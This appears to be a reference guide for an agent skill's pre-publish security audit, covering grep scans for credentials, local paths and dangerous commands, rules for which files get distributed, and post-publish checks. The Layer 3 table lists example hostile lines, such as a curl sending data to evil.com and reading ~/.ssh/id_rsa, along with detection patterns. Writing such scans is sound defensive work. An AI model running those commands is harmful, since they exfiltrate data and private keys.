# Security Audit Reference

Complete procedures for pre-publish security scanning, privacy scrubbing, and distribution judgment.

**When to read**: When entering Phase 2 (pre-publish audit). Read this file in full before running any scans.

---

## Three-Layer Security Scan

### Layer 1: Credential Leak Scan

**Grep pattern**: `token|api_key|api-key|secret|password|ghp_|gho_|ghs_|clh_|sk-|AKIA`

**PASS criteria**: Only conceptual mentions in security documentation (e.g., "requests credentials" in a security checklist). No actual token values, API keys, or secrets.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Git remote with token | `https://user:ghp_xxx@github.com/...` | Use SSH or credential helper |
| Hardcoded API key | `OPENAI_API_KEY = "sk-..."` | Move to `.env.local` |
| Config with real values | `"app_id": "cli_a976385..."` | Replace with placeholder in published config |
| Log files with tokens | `publish_run.log` containing `ghp_` | Add `*.log` to .gitignore |

### Layer 2: Local Path Scan

**Grep pattern**: `C:\\|D:\\|/Users/|/home/|Administrator|\.trae-cn|\.trae\\`

**PASS criteria**: Zero matches. No local absolute paths, no Windows usernames, no `.trae-cn` directory references.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Absolute paths in docs | `d:\TRAE SOLO CN\project\...` | Use relative paths |
| Username in paths | `C:\Users\Administrator\...` | Use `~` or `<user-home>` |
| .trae-cn references | `.trae-cn/skills/...` | Use `.trae/skills/` (generic) |

### Layer 3: Dangerous Command Scan

**Grep pattern**: `curl|wget|eval|exec|base64|sudo|\.ssh|\.aws|\.config`

**PASS criteria**: Only conceptual mentions in security documentation. No actual curl/wget to external URLs, no eval/exec with external input, no reading of sensitive directories.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| curl to external server | `curl https://evil.com/collect?data=...` | Remove entirely |
| eval with user input | `eval(user_input)` | Remove or sandbox |
| Reading sensitive dirs | `cat ~/.ssh/id_rsa` | Remove |

---

## Scan Execution

Run all three scans via Grep on the entire skill directory:

```
1. Grep: credential pattern → check each match → PASS/FAIL
2. Grep: local path pattern → check each match → PASS/FAIL
3. Grep: dangerous command pattern → check each match → PASS/FAIL
```

**Any FAIL = block publish.** Fix the issue, re-run scan. Only proceed when all three PASS.

---

## Distribution Judgment (Three-Question Test)

For each file in the skill directory, answer three questions:

1. **Does the user need this file after installing the skill?**
2. **Does this file participate in the skill's execution flow?**
3. **Can the skill still work if this file is deleted?**

| Category | Judgment | Action | Examples |
|----------|----------|--------|----------|
| Execution dependency | Three "yes" | Must include | SKILL.md, plugin.json, references/*.md, scripts/*.py |
| Project metadata | Not in execution, but users/devs need | Include | README.md, LICENSE, CHANGELOG.md, docs/*.md |
| Maintainer tools | Three "no" | Exclude | *.ps1, *.sh (publish scripts) |
| VCS config | Three "no" | Exclude from zip, keep in repo | .gitignore |
| Runtime data | Three "no" | Exclude | data/, *.log |
| Credential files | Three "no" + security risk | Must exclude | .env.local, config.local.json |

### Key Distinctions

- `.gitignore` stays in GitHub repo (for developers who clone) but excluded from ClawHub distribution
- `publish_all.ps1` and similar scripts are maintainer tools — never include in distribution
- `references/config.json` with placeholders IS an execution dependency — must include
- `references/config.local.json` with real credentials is NOT — must exclude

---

## Common Leak Patterns & Remediation

### Pattern 1: Token in git remote URL

```
# LEAKED
https://EdwardWason:ghp_xxx@github.com/EdwardWason/repo.git

# FIX: Use credential helper or SSH
git remote set-url origin git@github.com:EdwardWason/repo.git
```

### Pattern 2: .env.local in distribution

```
# FIX: Add to .gitignore AND exclusion list
.env.local
config.local.json
```

### Pattern 3: PowerShell script with local paths

```
# LEAKED: publish_all.ps1 contains "d:\TRAE SOLO CN\..."
# FIX: Exclude all .ps1 files from distribution
```

### Pattern 4: Log files with sensitive data

```
# LEAKED: publish_run.log contains tokens and local paths
# FIX: Add *.log to .gitignore and exclusion list
```

---

## Post-Publish Verification

After publishing, verify on both platforms:

### GitHub Verification

```powershell
# List all files in repo
$tree = Invoke-RestMethod -Uri "https://api.github.com/repos/$Owner/$Repo/git/trees/main?recursive=1" -Headers $Headers
$tree.tree | Where-Object { $_.type -eq "blob" } | ForEach-Object { Write-Host $_.path }
# Check: no data/, *.ps1, .env.local, *.log
```

### ClawHub Verification

```bash
clawhub inspect <slug>
# Check: Security field = CLEAN
# Check: file list contains only expected files
```
